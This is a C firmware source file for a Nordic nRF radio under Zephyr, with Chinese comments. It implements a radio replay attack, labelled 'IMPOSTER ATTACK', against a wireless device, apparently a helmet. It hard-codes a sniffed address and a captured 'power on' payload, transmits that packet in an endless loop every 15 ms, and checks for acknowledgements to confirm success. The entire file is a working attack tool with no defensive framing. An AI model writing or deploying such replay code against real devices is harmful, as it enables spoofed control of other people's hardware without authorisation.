#include <zephyr/kernel.h>
#include <zephyr/sys/printk.h>
#include <hal/nrf_radio.h>
#include <zephyr/usb/usb_device.h>
#include <zephyr/drivers/gpio.h>
#include <string.h>

// ================= 攻擊參數 (基於你抓到的 "開機後" 數據) =================

// 1. 頻率: 2404 MHz (不變)
#define TARGET_FREQ  4 

// 2. 地址: Pipe 1 真實組合 (00 D2 35 CF 35)
#define TARGET_ADDR_BASE   0xd235cf35
#define TARGET_ADDR_PREFIX 0x00

// 3. 攻擊載荷 (The Golden Packet)
// 這是你抓到的: "開機後 Data: 16 00 00 21 20 80 0F 7F..."
static const uint8_t REPLAY_PAYLOAD[] = {
    0x16, 0x00, 0x00, 0x21, 0x20, 0x80, 0x0F, 0x7F, 
    0xF0, 0x10, 0x04, 0x70, 0x0D, 0xBF, 0xF0, 0xBF, 
    0xC1, 0x60, 0x28, 0x71, 0x60, 0x02, 0xF1, 0x87, 
    0x96, 0x57, 0xC6, 0x67, 0xFE, 0x06, 0xA4, 0x2F
};

// =============================================================

#define LED0_NODE DT_ALIAS(led0)
static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);

static uint8_t packet_buffer[64];
static uint8_t rx_buffer[64];

void radio_disable(void) {
    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0);
    NRF_RADIO->EVENTS_DISABLED = 0;
}

void radio_init_attacker(void) {
    NRF_RADIO->POWER = 0;
    k_busy_wait(500);
    NRF_RADIO->POWER = 1;

    // 開啟 CRC (必須)
    NRF_RADIO->CRCCNF = (RADIO_CRCCNF_LEN_Two << RADIO_CRCCNF_LEN_Pos);
    NRF_RADIO->CRCPOLY = 0x11021; 
    NRF_RADIO->CRCINIT = 0xFFFF;

    NRF_RADIO->MODE = NRF_RADIO_MODE_BLE_2MBIT; 
    
    // 設定封包結構
    NRF_RADIO->PCNF0 = (8UL << RADIO_PCNF0_LFLEN_Pos);
    NRF_RADIO->PCNF1 = (60UL << RADIO_PCNF1_MAXLEN_Pos) | 
                       (4UL  << RADIO_PCNF1_BALEN_Pos) | 
                       (1UL  << RADIO_PCNF1_ENDIAN_Pos);

    NRF_RADIO->FREQUENCY = TARGET_FREQ;

    // 設定發送地址 (Pipe 1)
    NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
    NRF_RADIO->PREFIX0 = TARGET_ADDR_PREFIX; 
    
    NRF_RADIO->TXADDRESS = 0; 
    NRF_RADIO->RXADDRESSES = 1; 
}

void attack_sequence(void) {
    // 1. 填入數據
    memcpy(packet_buffer, REPLAY_PAYLOAD, sizeof(REPLAY_PAYLOAD));
    
    radio_disable();

    // 2. 發射 (TX)
    NRF_RADIO->PACKETPTR = (uint32_t)packet_buffer;
    NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk; 
    NRF_RADIO->EVENTS_END = 0;
    NRF_RADIO->TASKS_TXEN = 1;
    while (NRF_RADIO->EVENTS_END == 0); 
    NRF_RADIO->EVENTS_END = 0;
    
    // 3. 切換監聽 (RX) 等待 ACK
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0);
    NRF_RADIO->EVENTS_DISABLED = 0;

    NRF_RADIO->PACKETPTR = (uint32_t)rx_buffer;
    NRF_RADIO->TASKS_RXEN = 1; 

    // 4. 等待回應 (10ms)
    int64_t timeout = k_uptime_get() + 10; 
    bool ack_received = false;

    while (k_uptime_get() < timeout) {
        if (NRF_RADIO->EVENTS_END) {
            if (NRF_RADIO->CRCSTATUS == 1) {
                ack_received = true;
                break;
            } else {
                 NRF_RADIO->EVENTS_END = 0;
                 NRF_RADIO->TASKS_START = 1; 
            }
        }
        k_busy_wait(10); 
    }

    // 5. 結果回報
    if (ack_received) {
        int8_t rssi = -(int8_t)NRF_RADIO->RSSISAMPLE;
        
        printk(">>> [SUCCESS] ACK RECEIVED! RSSI: %d\n", rssi);
        
        // 抓到 ACK 後狂閃燈
        for(int i=0;i<5;i++) {
            gpio_pin_toggle_dt(&led);
            k_busy_wait(20000);
        }
    } else {
        radio_disable();
    }
}

int main(void) {
    usb_enable(NULL);
    if (device_is_ready(led.port)) {
        gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
    }

    printk("\n=== IMPOSTER ATTACK (Using 'Power On' Packet) ===\n");
    
    radio_init_attacker();

    while (1) {
        attack_sequence();
        
        // 慢閃表示工作中
        gpio_pin_toggle_dt(&led);
        
        // 模擬頭盔的發送頻率 (約 10-20ms 一次)
        k_sleep(K_MSEC(15));
    }
}
